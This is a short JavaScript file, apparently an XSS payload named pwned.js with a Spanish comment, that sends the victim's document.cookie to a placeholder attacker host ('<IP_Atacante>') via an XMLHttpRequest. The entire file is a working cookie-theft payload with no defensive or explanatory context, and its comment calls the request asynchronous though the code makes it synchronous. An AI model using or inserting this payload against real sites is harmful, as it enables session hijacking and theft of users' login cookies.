// pwned.js - exfiltra cookies mediante XHR (asíncrono)
var req = new XMLHttpRequest();
req.open('GET', "http://<IP_Atacante>/?cookie="+document.cookie, false);
req.send();
